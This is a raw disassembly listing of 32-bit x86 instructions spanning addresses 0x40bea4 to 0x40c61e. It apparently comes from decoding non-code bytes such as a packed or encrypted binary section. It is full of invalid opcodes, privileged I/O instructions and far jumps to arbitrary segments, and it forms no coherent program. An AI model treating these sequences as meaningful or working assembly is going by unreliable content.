  40bea4:	mov    DWORD PTR [esp+ebx*1-0x15],edi
  40bea8:	mov    WORD PTR [ebx],ss
  40beaa:	mov    ebp,DWORD PTR [eax+esi*1]
  40bead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beae:	aas    
  40beaf:	mov    al,ds:0x9f32e756
  40beb4:	cdq    
  40beb5:	fstp   st(1)
  40beb7:	add    ah,BYTE PTR [ebx+ebx*2]
  40beba:	lock xor esp,edx
  40bebd:	clc    
  40bebe:	mov    ebx,0x6ac4dad4
  40bec3:	and    al,0xb1
  40bec5:	scas   eax,DWORD PTR es:[edi]
  40bec6:	add    dl,BYTE PTR [edx]
  40bec8:	or     BYTE PTR [esi+edx*2-0x14],ch
  40becc:	push   ecx
  40becd:	loop   0x40be83
  40becf:	stos   BYTE PTR es:[edi],al
  40bed0:	clc    
  40bed1:	cmp    BYTE PTR [esi+0x64],ah
  40bed4:	(bad)  
  40bed5:	or     BYTE PTR [ebx+0x6a91b86f],al
  40bedb:	stc    
  40bedc:	ss sbb eax,0x4ffe294e
  40bee2:	mov    ds:0x79ab79f2,eax
  40bee7:	mov    ebx,0x23a84585
  40beec:	pushf  
  40beed:	fdivr  st,st(4)
  40beef:	xchg   ebp,eax
  40bef0:	outs   dx,DWORD PTR ds:[esi]
  40bef1:	xchg   esp,eax
  40bef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef3:	lahf   
  40bef4:	or     eax,0xd91a1171
  40bef9:	sub    ebp,0x1b19285b
  40beff:	jmp    0xb9a:0xceb2ef2
  40bf06:	sub    BYTE PTR [edx-0x48],ah
  40bf09:	(bad)  [eax]
  40bf0b:	mov    bh,0x67
  40bf0d:	mov    ds:0xcbcaf55f,eax
  40bf12:	adc    al,BYTE PTR [ebx+0x3a225756]
  40bf18:	loop   0x40bf3b
  40bf1a:	test   DWORD PTR [edx+0x72],esp
  40bf1d:	sub    eax,DWORD PTR [ebx]
  40bf1f:	sub    eax,0x93c268b1
  40bf24:	mov    eax,ds:0x502ccbb6
  40bf29:	xchg   esi,eax
  40bf2a:	mov    cl,0x5d
  40bf2c:	aad    0x2a
  40bf2e:	cmp    bh,bl
  40bf30:	shl    WORD PTR [ebx-0x72],cl
  40bf34:	cmp    edi,DWORD PTR [esi-0x747a7c75]
  40bf3a:	hlt    
  40bf3b:	jl     0x40bec4
  40bf3d:	and    BYTE PTR [ebp+0x3a],ch
  40bf40:	jmp    0x627de66a
  40bf45:	in     al,dx
  40bf46:	push   ds
  40bf47:	inc    edx
  40bf48:	imul   eax,DWORD PTR [ebx],0x38
  40bf4b:	jmp    0xcc84:0x60c1579e
  40bf52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf53:	shr    ebx,cl
  40bf55:	icebp  
  40bf56:	shr    bh,1
  40bf58:	shl    ebx,0xca
  40bf5b:	cmp    esp,DWORD PTR [ecx]
  40bf5d:	push   edi
  40bf5e:	pop    edi
  40bf5f:	loopne 0x40bf57
  40bf61:	or     dl,cl
  40bf63:	lea    edx,[edx+0x12bd1d97]
  40bf69:	stos   DWORD PTR es:[edi],eax
  40bf6a:	jmp    0xcbe3:0x85105f14
  40bf71:	inc    edi
  40bf72:	leave  
  40bf73:	lods   al,BYTE PTR ds:[esi]
  40bf74:	aas    
  40bf75:	aaa    
  40bf76:	or     DWORD PTR [edx+0x1d],0x5d
  40bf7a:	inc    ecx
  40bf7b:	icebp  
  40bf7c:	mov    ch,BYTE PTR [esi+ebx*4+0x2aaf487a]
  40bf83:	xor    BYTE PTR [edx+0xb],dh
  40bf86:	fldcw  WORD PTR [esi+eax*8]
  40bf89:	outs   dx,BYTE PTR ds:[esi]
  40bf8a:	nop
  40bf8b:	out    0x92,eax
  40bf8d:	xchg   DWORD PTR [edx+0x54],edi
  40bf90:	mov    dh,0xe1
  40bf92:	pop    ss
  40bf93:	mov    ds:0xdcabe9fa,al
  40bf98:	jno    0x40bf6c
  40bf9a:	jmp    0x35:0xc5e6477d
  40bfa1:	cmp    eax,0x6dbf5d77
  40bfa6:	stos   BYTE PTR es:[edi],al
  40bfa7:	and    al,0x1f
  40bfa9:	push   ecx
  40bfaa:	pop    ebp
  40bfab:	sbb    BYTE PTR [ecx],al
  40bfad:	outs   dx,DWORD PTR ds:[esi]
  40bfae:	xchg   DWORD PTR [edx+0x63],ebp
  40bfb1:	mov    esi,0xff34fdcf
  40bfb6:	push   0x260546f4
  40bfbb:	call   0x4ad7:0x4e0d619d
  40bfc2:	xchg   ebp,eax
  40bfc3:	adc    DWORD PTR [ecx-0x23cbc70c],ebx
  40bfc9:	or     edx,ecx
  40bfcb:	fs (bad) 
  40bfcd:	push   0x32
  40bfcf:	and    eax,0x3202462f
  40bfd4:	(bad)
  40bfd7:	xchg   ecx,eax
  40bfd8:	and    DWORD PTR [ebp-0x7c589b43],edi
  40bfde:	enter  0x8b57,0x56
  40bfe2:	or     BYTE PTR [ebp-0x8afcde8],dh
  40bfe8:	std    
  40bfe9:	inc    eax
  40bfea:	icebp  
  40bfeb:	add    ch,bl
  40bfed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfee:	ins    DWORD PTR es:[edi],dx
  40bfef:	cmc    
  40bff0:	sar    ah,0xd3
  40bff3:	xchg   ebx,eax
  40bff4:	shl    BYTE PTR [edi+0x10f39124],cl
  40bffa:	push   es
  40bffb:	adc    ebx,DWORD PTR [ebx-0x5692765a]
  40c001:	or     DWORD PTR [edx*8-0x3dd5d80b],0xe36983d1
  40c00c:	std    
  40c00d:	js     0x40c075
  40c00f:	jmp    0x40c082
  40c011:	sub    al,0x32
  40c013:	push   edx
  40c014:	adc    al,0x59
  40c016:	(bad)  
  40c017:	in     al,0x2
  40c019:	jns    0x40c03f
  40c01b:	fild   QWORD PTR [ebp-0x4e40de80]
  40c021:	std    
  40c022:	test   DWORD PTR [edi-0x336162d3],edi
  40c028:	pop    ecx
  40c029:	test   BYTE PTR [di+0x620c],cl
  40c02e:	pusha  
  40c02f:	pop    es
  40c030:	adc    BYTE PTR [edx-0x56],dl
  40c033:	lahf   
  40c034:	cwde   
  40c035:	lds    eax,FWORD PTR [ebx+0x5b]
  40c038:	inc    ebx
  40c039:	jae    0x40c064
  40c03b:	leave  
  40c03c:	repz ds fcmovnu st,st(5)
  40c040:	in     al,dx
  40c041:	mov    ch,0x21
  40c043:	xchg   edx,eax
  40c044:	mov    eax,0x63bad55f
  40c049:	inc    edx
  40c04a:	jg     0x40c02b
  40c04c:	loop   0x40c076
  40c04e:	xlat   BYTE PTR ds:[ebx]
  40c04f:	ret    0xe765
  40c052:	ror    BYTE PTR [ebx+0x14943a49],0x43
  40c059:	mov    ss,WORD PTR [ebx-0x65]
  40c05c:	add    al,0x8d
  40c05e:	inc    edi
  40c05f:	out    dx,eax
  40c060:	iret   
  40c061:	jns    0x40c0b3
  40c063:	add    al,0x31
  40c065:	(bad)  
  40c066:	rcr    cl,cl
  40c068:	js     0x40c09f
  40c06a:	in     al,dx
  40c06b:	icebp  
  40c06c:	push   ecx
  40c06d:	adc    ax,0xc660
  40c071:	cmp    al,bl
  40c073:	stos   BYTE PTR es:[edi],al
  40c074:	add    esi,DWORD PTR [ebx]
  40c076:	loope  0x40c02f
  40c078:	ins    BYTE PTR es:[edi],dx
  40c079:	pop    es
  40c07a:	or     al,0xff
  40c07c:	lods   al,BYTE PTR ds:[esi]
  40c07d:	adc    al,0x1
  40c07f:	pop    ds
  40c080:	dec    ebx
  40c081:	jge    0x40c0e5
  40c083:	hlt    
  40c084:	loope  0x40c035
  40c086:	mov    edx,0x7c458b71
  40c08b:	sub    bh,BYTE PTR [ecx]
  40c08d:	inc    ecx
  40c08e:	xor    BYTE PTR [edi+0x79ff179f],ah
  40c094:	push   edi
  40c095:	iret   
  40c096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c097:	dec    eax
  40c098:	jmp    0x2abb:0xeda4751
  40c09f:	and    cl,BYTE PTR [ecx+0x32973249]
  40c0a5:	mov    edx,0x23784cf5
  40c0aa:	xor    eax,0xfec2134a
  40c0af:	dec    esi
  40c0b0:	clc    
  40c0b1:	push   cs
  40c0b2:	sub    BYTE PTR [eax+0x61],0x27
  40c0b6:	call   0x9d4a7268
  40c0bb:	xlat   BYTE PTR ds:[ebx]
  40c0bc:	mov    BYTE PTR [edx-0x3c],dl
  40c0bf:	retf   
  40c0c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c1:	lods   al,BYTE PTR ds:[esi]
  40c0c2:	sti    
  40c0c3:	lahf   
  40c0c4:	mov    ah,0x9a
  40c0c6:	test   DWORD PTR [eax-0x6f9c79c3],edi
  40c0cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0cd:	adc    ecx,DWORD PTR [esi+0x71]
  40c0d0:	dec    esp
  40c0d1:	cld    
  40c0d2:	add    DWORD PTR [ebp+0x68d34855],edi
  40c0d8:	mov    ah,0x67
  40c0da:	call   0xcf749460
  40c0df:	pop    esp
  40c0e0:	test   al,0x15
  40c0e2:	mul    BYTE PTR [ebx-0x295d5064]
  40c0e8:	xchg   esp,eax
  40c0e9:	jecxz  0x40c163
  40c0eb:	stc    
  40c0ec:	xor    al,BYTE PTR [ecx+0x25]
  40c0ef:	sub    al,0x20
  40c0f2:	add    ebp,DWORD PTR [eax]
  40c0f4:	enter  0xdffa,0x87
  40c0f8:	mul    DWORD PTR [esi]
  40c0fa:	push   edi
  40c0fb:	icebp  
  40c0fc:	iret   
  40c0fd:	xor    BYTE PTR [ebx-0x2d],ch
  40c100:	mov    dl,0x47
  40c102:	popf   
  40c103:	or     BYTE PTR [esi-0x41],cl
  40c106:	xchg   esp,eax
  40c107:	mov    al,BYTE PTR [edi-0x2ffebbb4]
  40c10d:	in     al,dx
  40c10e:	aaa    
  40c10f:	pop    es
  40c110:	aas    
  40c111:	pop    es
  40c112:	repz mov bl,0x2c
  40c115:	or     dl,BYTE PTR [esi]
  40c117:	add    ch,cl
  40c119:	stos   DWORD PTR es:[edi],eax
  40c11a:	jmp    0xdcd10281
  40c11f:	nop
  40c120:	lea    edx,[edx+0x39]
  40c123:	dec    esi
  40c124:	mov    al,0x3b
  40c126:	call   0x813b387
  40c12b:	jmp    0xaab0:0xe8bd0a04
  40c132:	inc    eax
  40c133:	retf   
  40c134:	lea    ebx,ss:[esi-0x28]
  40c138:	das    
  40c139:	dec    ebx
  40c13a:	xor    eax,0xf347311c
  40c13f:	xchg   edx,eax
  40c140:	sub    BYTE PTR [esi],al
  40c142:	push   ds
  40c143:	pop    ds
  40c144:	(bad)  
  40c146:	xchg   BYTE PTR [edi-0x67],bl
  40c149:	pop    ecx
  40c14a:	outs   dx,BYTE PTR ds:[esi]
  40c14b:	mov    WORD PTR [ecx],ds
  40c14d:	xchg   edi,eax
  40c14e:	pusha  
  40c14f:	enter  0xfb8f,0xc8
  40c153:	sub    BYTE PTR [ecx-0x54],dh
  40c156:	mov    ecx,0xb3654522
  40c15b:	xchg   ebx,eax
  40c15c:	inc    edi
  40c15d:	jge    0x40c11d
  40c15f:	lahf   
  40c160:	pop    ss
  40c161:	shl    DWORD PTR [ecx-0x21974394],0x4e
  40c168:	test   DWORD PTR [edi-0x7d],edx
  40c16b:	(bad)  
  40c16c:	aad    0xbd
  40c16e:	xlat   BYTE PTR ds:[ebx]
  40c16f:	push   ebp
  40c170:	div    DWORD PTR [esi+0xb]
  40c173:	push   eax
  40c174:	sub    BYTE PTR [eax],0xad
  40c177:	bound  esp,QWORD PTR ds:0x135a0b1b
  40c17d:	bswap  edx
  40c17f:	xchg   edi,eax
  40c180:	add    eax,0x37d96b3f
  40c185:	pusha  
  40c186:	or     esp,DWORD PTR [esi]
  40c188:	xor    bl,BYTE PTR [ecx+0x1d]
  40c18b:	cli    
  40c18c:	cmp    esi,DWORD PTR [ebx+eiz*8]
  40c18f:	(bad)  
  40c190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c191:	mov    esp,0x8b05cbf8
  40c196:	std    
  40c197:	mov    ds:0x11e3278a,eax
  40c19c:	mov    edi,0x4275ebfe
  40c1a1:	ror    BYTE PTR [edi+0x12],0xc7
  40c1a5:	pop    esp
  40c1a6:	xor    bl,dh
  40c1a8:	aam    0xf8
  40c1aa:	and    dh,BYTE PTR [ebx+0x5f42c149]
  40c1b0:	lods   al,BYTE PTR ds:[esi]
  40c1b1:	add    ch,BYTE PTR [ebx]
  40c1b3:	sbb    al,0x7a
  40c1b5:	scas   al,BYTE PTR es:[edi]
  40c1b6:	ds jg  0x40c15e
  40c1b9:	sub    bl,bh
  40c1bb:	lds    edi,FWORD PTR [eax+0x37]
  40c1be:	jecxz  0x40c1a6
  40c1c0:	es inc esp
  40c1c2:	lods   al,BYTE PTR ds:[esi]
  40c1c3:	sub    ch,ch
  40c1c5:	out    dx,eax
  40c1c6:	mov    dh,0x8b
  40c1c8:	push   eax
  40c1ca:	pop    esi
  40c1cb:	cmc    
  40c1cc:	out    0x62,al
  40c1ce:	mov    dl,BYTE PTR [eax-0x68]
  40c1d1:	add    al,0xf9
  40c1d3:	adc    bl,dl
  40c1d5:	scas   eax,DWORD PTR es:[edi]
  40c1d6:	and    BYTE PTR [ecx-0x20],dl
  40c1d9:	add    BYTE PTR [edx+0x6b],dh
  40c1dc:	dec    esp
  40c1dd:	outs   dx,DWORD PTR ds:[esi]
  40c1de:	loopne 0x40c25c
  40c1e0:	cs cli 
  40c1e2:	stc    
  40c1e3:	mov    edi,0xa287e837
  40c1e8:	sbb    eax,0xa524e6b7
  40c1ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ee:	idiv   DWORD PTR [ebp+0x40]
  40c1f1:	cmp    edi,DWORD PTR [esi+0x5fcec4b0]
  40c1f7:	push   es
  40c1f8:	ret    0xd0
  40c1fb:	cmc    
  40c1fc:	inc    ebp
  40c1fd:	or     esi,DWORD PTR [edx+0x7cbf1a84]
  40c203:	jo     0x40c1f6
  40c205:	jne    0x40c281
  40c207:	inc    edi
  40c208:	or     BYTE PTR [eax+0x5e7e1aef],0xda
  40c20f:	cmp    al,0xbd
  40c211:	xchg   BYTE PTR [edi+0x61],al
  40c214:	sub    eax,0x11b311a7
  40c219:	fisttp WORD PTR [edi]
  40c21b:	jp     0x40c1cf
  40c21d:	push   0x1c
  40c21f:	and    BYTE PTR [edi+0x2a45acce],0xb0
  40c226:	or     BYTE PTR [edx],bh
  40c228:	outs   dx,BYTE PTR ds:[esi]
  40c229:	(bad)  
  40c22a:	cmc    
  40c22b:	lahf   
  40c22c:	push   edx
  40c22d:	lahf   
  40c22e:	jle    0x40c1b0
  40c230:	jns    0x40c215
  40c232:	pusha  
  40c233:	lods   eax,DWORD PTR ds:[esi]
  40c234:	inc    edx
  40c235:	fwait
  40c236:	rcl    BYTE PTR [ebx+eax*4],cl
  40c239:	dec    eax
  40c23a:	dec    eax
  40c23b:	ret    0x97fc
  40c23e:	mov    edx,gs
  40c240:	ret    0xb221
  40c243:	mov    ecx,0xdc99dc06
  40c248:	loop   0x40c256
  40c24a:	loop   0x40c256
  40c24c:	bound  edi,QWORD PTR [esi+ebx*2]
  40c24f:	push   ecx
  40c250:	jbe    0x40c26f
  40c252:	mov    bl,0x16
  40c254:	push   ecx
  40c255:	jbe    0x40c20c
  40c257:	cdq    
  40c258:	(bad)  
  40c25a:	xor    edx,DWORD PTR [eax+0x2e]
  40c25d:	(bad)  
  40c25e:	iret   
  40c25f:	pop    ebx
  40c260:	js     0x40c209
  40c262:	mov    BYTE PTR [ecx+0x23a06fba],0x5d
  40c269:	adc    dh,cl
  40c26b:	dec    edx
  40c26c:	fisub  WORD PTR [ebx]
  40c26e:	retf   0x8162
  40c271:	push   eax
  40c272:	lea    ebx,ds:0xc8dc8d5
  40c278:	fmul   DWORD PTR [edi]
  40c27a:	pause  
  40c27c:	adc    eax,0x5e4820f2
  40c281:	jne    0x40c2f8
  40c283:	push   ds
  40c284:	jle    0x40c209
  40c286:	mov    esp,0xe3516a46
  40c28b:	sbb    ebx,edx
  40c28d:	dec    esi
  40c28e:	inc    ebx
  40c28f:	push   eax
  40c290:	dec    ebp
  40c291:	mov    ds:0x6cb0bdc0,al
  40c296:	(bad)  
  40c298:	push   es
  40c299:	test   BYTE PTR [ebx+edx*1+0x2aa9b5ea],0xc4
  40c2a1:	aaa    
  40c2a2:	sub    dh,0xed
  40c2a5:	sub    cl,0x5b
  40c2a8:	dec    esi
  40c2a9:	call   0xd7db:0x7760440d
  40c2b0:	and    al,0x24
  40c2b2:	mov    bh,0xa
  40c2b4:	mov    esi,0x2e70e5ec
  40c2b9:	ins    BYTE PTR es:[edi],dx
  40c2ba:	es (bad) 
  40c2bc:	or     ebp,eax
  40c2be:	in     eax,0x72
  40c2c0:	jae    0x40c279
  40c2c2:	div    DWORD PTR [eax-0x363591d7]
  40c2c8:	test   eax,0x1138308a
  40c2cd:	cmp    al,0x75
  40c2cf:	fsub   DWORD PTR [eax-0x42e12f8b]
  40c2d5:	sub    BYTE PTR [eax-0x75eb7e17],0x78
  40c2dc:	cmp    al,0x7
  40c2de:	imul   dl
  40c2e0:	clc    
  40c2e1:	jne    0x40c305
  40c2e3:	or     dh,BYTE PTR [ecx]
  40c2e5:	nop
  40c2e6:	xchg   edx,eax
  40c2e7:	sbb    ah,BYTE PTR [ebp+0x47]
  40c2ea:	popf   
  40c2eb:	dec    ebx
  40c2ec:	add    cl,BYTE PTR [edi+0x20db56d0]
  40c2f2:	retf   
  40c2f3:	nop
  40c2f4:	cmp    al,BYTE PTR [edx]
  40c2f6:	cli    
  40c2f7:	fisttp WORD PTR [edx+edx*1]
  40c2fa:	mov    al,ds:0xf71bfed4
  40c2ff:	jo     0x40c2f9
  40c301:	push   cs
  40c302:	std    
  40c303:	fisttp DWORD PTR [edx-0x38baa63e]
  40c309:	xor    esi,DWORD PTR ds:[edx+0x44]
  40c30d:	(bad)  
  40c30e:	test   eax,0x71167e8a
  40c313:	rol    esp,cl
  40c315:	push   esp
  40c316:	adc    bh,BYTE PTR [edx+0x56ddb4fc]
  40c31c:	fwait
  40c31d:	out    0xc,al
  40c31f:	in     al,0x37
  40c321:	in     eax,dx
  40c322:	mov    dl,0x21
  40c324:	fs pushf 
  40c326:	scas   al,BYTE PTR es:[edi]
  40c327:	int3   
  40c328:	ss leave 
  40c32a:	enter  0xb6df,0xd3
  40c32e:	mov    edx,0x45f0090f
  40c333:	pop    es
  40c334:	inc    esi
  40c335:	int3   
  40c336:	fbstp  TBYTE PTR gs:[ecx]
  40c339:	mov    eax,0x333d4cc1
  40c33e:	call   0x501d:0x26ea6d45
  40c345:	sub    BYTE PTR [edi+0x57],ah
  40c348:	sub    ebx,DWORD PTR [edx+0x3d38b0f5]
  40c34e:	inc    edi
  40c34f:	push   es
  40c350:	(bad)  
  40c351:	push   cs
  40c352:	xchg   esi,eax
  40c353:	in     al,0x56
  40c355:	add    eax,0x9eac30e1
  40c35a:	out    dx,eax
  40c35b:	enter  0x6c71,0x6d
  40c35f:	adc    bl,BYTE PTR [ebx+0x53]
  40c362:	fadd   QWORD PTR [ecx-0x66fbaf42]
  40c368:	mov    bh,0x46
  40c36a:	inc    edx
  40c36b:	push   cs
  40c36c:	js     0x40c3b4
  40c36e:	mov    WORD PTR [edi-0x64],gs
  40c371:	push   ss
  40c372:	shl    DWORD PTR [ebx-0x2b],0x51
  40c376:	xchg   ebp,eax
  40c377:	jmp    0xdd62:0xde2f8364
  40c37e:	fmul   QWORD PTR [ecx+0xf]
  40c381:	or     dl,BYTE PTR [ecx+0x4f]
  40c384:	jmp    0x40c37e
  40c386:	push   ebx
  40c387:	(bad)  
  40c388:	sbb    DWORD PTR [ebp+0x697efe99],eax
  40c38e:	add    eax,0x4cb9c290
  40c393:	jmp    0x4cba:0x1c088f3b
  40c39a:	test   BYTE PTR [eax+edi*2],bh
  40c39d:	popf   
  40c39e:	push   ebx
  40c39f:	sub    esp,0xffffffe7
  40c3a2:	leave  
  40c3a3:	adc    ah,BYTE PTR [ebp-0x1b]
  40c3a6:	jl     0x40c392
  40c3a8:	mov    eax,ds:0xd580972
  40c3ad:	or     ecx,ebx
  40c3af:	cmc    
  40c3b0:	lock pop esi
  40c3b2:	stc    
  40c3b3:	jecxz  0x40c3b4
  40c3b5:	mov    ds:0x5371f4f4,eax
  40c3ba:	or     eax,0xf219ed96
  40c3bf:	xor    edi,DWORD PTR fs:[ecx]
  40c3c2:	in     eax,0xa
  40c3c4:	pop    esp
  40c3c5:	fbstp  TBYTE PTR [edi+0x7fb5f7f2]
  40c3cb:	aad    0xcc
  40c3cd:	mov    ebp,0xdff3eec8
  40c3d2:	push   0xffffffd7
  40c3d4:	jae    0x40c40e
  40c3d6:	dec    ebp
  40c3d7:	mov    edi,0xaea0f0ec
  40c3dc:	jg     0x40c3b4
  40c3de:	shr    eax,cl
  40c3e0:	ins    DWORD PTR es:[edi],dx
  40c3e1:	and    dh,BYTE PTR [ecx]
  40c3e3:	cmp    al,0xce
  40c3e5:	push   ss
  40c3e6:	add    eax,0xfd75fca0
  40c3eb:	ret    
  40c3ec:	outs   dx,BYTE PTR ds:[esi]
  40c3ed:	test   al,0x37
  40c3ef:	mov    ?,ebp
  40c3f1:	shr    bh,1
  40c3f3:	ins    DWORD PTR es:[edi],dx
  40c3f4:	xor    DWORD PTR [ecx-0x68],ebx
  40c3f7:	jb     0x40c37d
  40c3f9:	xchg   ebx,eax
  40c3fa:	test   DWORD PTR [esp+edi*8+0xf],edx
  40c3fe:	mov    esi,0x60bdbaf8
  40c403:	dec    esp
  40c404:	retf   0xa3c4
  40c407:	call   0x6f6d:0xfb3fe812
  40c40e:	in     eax,dx
  40c40f:	retf   0xbb1c
  40c412:	out    dx,eax
  40c413:	es dec edi
  40c415:	lahf   
  40c416:	mov    ch,0x5e
  40c418:	popf   
  40c419:	jmp    0x91e5fcf0
  40c41e:	adc    DWORD PTR [ebp+0x29],ebx
  40c421:	adc    ch,ch
  40c423:	jmp    0x40c446
  40c425:	call   0x2fb9:0x177464af
  40c42c:	les    edx,FWORD PTR [edi-0x2eb0ec3d]
  40c432:	adc    eax,DWORD PTR [eax+edx*4]
  40c435:	std    
  40c436:	cli    
  40c437:	jmp    0xb1d31f01
  40c43c:	inc    eax
  40c43d:	or     ch,bl
  40c43f:	repz push ds
  40c441:	and    eax,edx
  40c443:	shl    BYTE PTR [ebx],cl
  40c445:	call   0x952e50f0
  40c44a:	or     eax,0x3d085492
  40c44f:	lahf   
  40c450:	int    0x86
  40c452:	call   0xfdc9:0x2557c4f1
  40c459:	adc    DWORD PTR [ecx],ebx
  40c45b:	cmp    ebp,ecx
  40c45d:	mov    bh,0x49
  40c45f:	or     eax,0xdb4445af
  40c464:	call   0xd696:0xadb11265
  40c46b:	jl     0x40c3f8
  40c46d:	cmp    ebx,edi
  40c46f:	mov    ds:0x66214384,eax
  40c474:	les    ecx,FWORD PTR [eax+0x59]
  40c477:	adc    al,0xa9
  40c479:	xor    eax,0x84696a84
  40c47e:	inc    edx
  40c47f:	jl     0x40c4e5
  40c481:	mov    DWORD PTR [eax+eax*2],ecx
  40c484:	push   edx
  40c485:	mov    ah,0xe7
  40c487:	sbb    esp,ecx
  40c489:	cld    
  40c48a:	stos   DWORD PTR es:[edi],eax
  40c48b:	sub    BYTE PTR [ebp+0x71],al
  40c48e:	pop    ds
  40c48f:	xchg   DWORD PTR [esi-0x4407b8f9],ebp
  40c495:	add    al,0xf9
  40c497:	icebp  
  40c498:	adc    ecx,DWORD PTR [edx+0x53796a7d]
  40c49e:	ror    ah,cl
  40c4a0:	inc    edi
  40c4a1:	shl    dh,cl
  40c4a3:	push   0x35
  40c4a5:	in     al,dx
  40c4a6:	call   0xe8e90965
  40c4ab:	add    al,BYTE PTR [edx-0x5cfab07b]
  40c4b1:	fdivrp st(4),st
  40c4b3:	bound  esi,QWORD PTR [edi]
  40c4b5:	sub    al,0x72
  40c4b7:	xchg   esi,eax
  40c4b8:	fnclex 
  40c4ba:	inc    esp
  40c4bb:	jg     0x40c475
  40c4bd:	push   ebx
  40c4be:	mov    ss,WORD PTR [edi-0x3ff783cb]
  40c4c4:	mov    al,ds:0xd4ed3824
  40c4c9:	leave  
  40c4ca:	imul   ebx,DWORD PTR [esi],0x4a
  40c4cd:	(bad)  
  40c4ce:	(bad)  
  40c4d0:	repz retf 0xcaaf
  40c4d4:	jle    0x40c521
  40c4d6:	leave  
  40c4d7:	cmp    DWORD PTR ds:0x174f9e54,ebp
  40c4dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4de:	pop    ss
  40c4df:	enter  0xed17,0x69
  40c4e3:	sub    ebp,DWORD PTR [edx+0x2d9505c1]
  40c4e9:	dec    eax
  40c4ea:	jmp    0x40c532
  40c4ec:	fisub  DWORD PTR [ecx+0x7c]
  40c4ef:	mov    ch,0x52
  40c4f1:	cmp    ch,BYTE PTR [eax+ebp*8]
  40c4f4:	mov    ebp,0x3e71c3fa
  40c4f9:	pop    es
  40c4fa:	mov    bh,0xfd
  40c4fc:	test   al,0x4c
  40c4fe:	inc    ebx
  40c4ff:	xchg   ebp,eax
  40c500:	jbe    0x40c4ce
  40c502:	jmp    0xb80b:0xebb0f5f8
  40c509:	dec    edx
  40c50a:	sbb    DWORD PTR [edi+edi*4-0x48],eax
  40c50e:	ss pushf 
  40c510:	popf   
  40c511:	bound  edx,QWORD PTR [esi]
  40c513:	shl    BYTE PTR [eax-0x4fa75e0f],cl
  40c519:	test   DWORD PTR [edx],ebx
  40c51b:	inc    eax
  40c51c:	repz ret 
  40c51e:	mov    bl,cl
  40c520:	xlat   BYTE PTR ds:[ebx]
  40c521:	push   0x7402192d
  40c526:	retf   
  40c527:	out    dx,eax
  40c528:	add    BYTE PTR [ecx],bh
  40c52a:	jbe    0x40c559
  40c52c:	jg     0x40c4e9
  40c52e:	es push edi
  40c530:	in     al,dx
  40c531:	mov    al,ds:0xfb54ee72
  40c536:	mov    ds:0xbc0077b4,eax
  40c53b:	jo     0x40c58d
  40c53d:	add    eax,0x7cdf63b9
  40c542:	shl    BYTE PTR [edi+0x48],cl
  40c545:	mov    BYTE PTR [eax-0x55],ah
  40c548:	mov    eax,0x2a96b1e8
  40c54d:	mov    ebx,ss
  40c54f:	jae    0x40c58b
  40c551:	xchg   esi,eax
  40c552:	popf   
  40c553:	out    dx,eax
  40c554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c555:	pop    eax
  40c556:	mov    al,0x58
  40c558:	dec    ecx
  40c559:	push   ebp
  40c55a:	push   esi
  40c55b:	mov    BYTE PTR [ebp+0x4d],dh
  40c55e:	into   
  40c55f:	xchg   ebp,eax
  40c560:	push   edi
  40c561:	dec    esi
  40c562:	or     al,0xe3
  40c565:	jmp    0x40c5d3
  40c567:	dec    ebp
  40c568:	in     al,0xd5
  40c56a:	push   esi
  40c56b:	test   eax,0x36f4c1b6
  40c570:	xchg   esi,eax
  40c571:	mul    DWORD PTR ds:0xb25af305
  40c577:	mov    ecx,0xcf6023b
  40c57c:	call   0x60c21b6a
  40c581:	xchg   edi,eax
  40c582:	mov    esi,0x990ec448
  40c587:	jmp    0xc99a:0xdcfcbf38
  40c58e:	xor    eax,0xecf9b7c4
  40c593:	ja     0x40c52b
  40c595:	dec    esp
  40c596:	sbb    BYTE PTR [esi+eiz*4],bh
  40c599:	int3   
  40c59a:	jo     0x40c566
  40c59c:	in     eax,dx
  40c59d:	jno    0x40c5e7
  40c59f:	adc    BYTE PTR [esi-0x15],bl
  40c5a2:	loope  0x40c547
  40c5a4:	adc    BYTE PTR [edi-0x1a9405f7],bl
  40c5aa:	in     al,dx
  40c5ab:	push   ss
  40c5ac:	mov    WORD PTR [esp+ebp*2+0x74],?
  40c5b0:	xchg   esi,eax
  40c5b2:	popa   
  40c5b3:	lahf   
  40c5b4:	jb     0x40c5fe
  40c5b6:	xor    DWORD PTR [ebx-0x5b],ecx
  40c5b9:	cmp    esp,DWORD PTR [ecx+0x50]
  40c5bc:	(bad)  
  40c5be:	sbb    eax,0xc29ed2cd
  40c5c3:	mov    ?,edi
  40c5c5:	js     0x40c549
  40c5c7:	fisttp DWORD PTR [esi+0x7b]
  40c5ca:	mov    esp,0xfb8709f
  40c5cf:	aaa    
  40c5d0:	outs   dx,BYTE PTR ds:[esi]
  40c5d1:	lock ret 
  40c5d3:	addr16 lahf 
  40c5d5:	call   0xf1bd9cf4
  40c5da:	inc    edi
  40c5db:	(bad)  
  40c5dd:	or     BYTE PTR [edi+0x20],bl
  40c5e0:	adc    dh,BYTE PTR [ecx+0x4c]
  40c5e3:	in     al,dx
  40c5e4:	popf   
  40c5e5:	cli    
  40c5e6:	xchg   edx,eax
  40c5e7:	pop    esp
  40c5e8:	mov    BYTE PTR [edi-0x3685941b],dl
  40c5ee:	loope  0x40c602
  40c5f0:	fnstsw WORD PTR [edx+0x78]
  40c5f3:	in     eax,0x8c
  40c5f5:	jl     0x40c5b0
  40c5f7:	and    eax,0x2b8641a1
  40c5fc:	dec    esp
  40c5fd:	stos   BYTE PTR es:[edi],al
  40c5fe:	mov    eax,0x2882633a
  40c603:	xor    eax,0xd3807452
  40c608:	add    DWORD PTR [edi],0x119d3dc2
  40c60e:	cmc    
  40c60f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c610:	sub    DWORD PTR [ebx],0x1a7fbed2
  40c616:	xlat   BYTE PTR ds:[ebx]
  40c617:	aam    0x10
  40c619:	std    
  40c61a:	stos   BYTE PTR es:[edi],al
  40c61b:	loop   0x40c671
  40c61d:	dec    edi
  40c61e:	icebp  
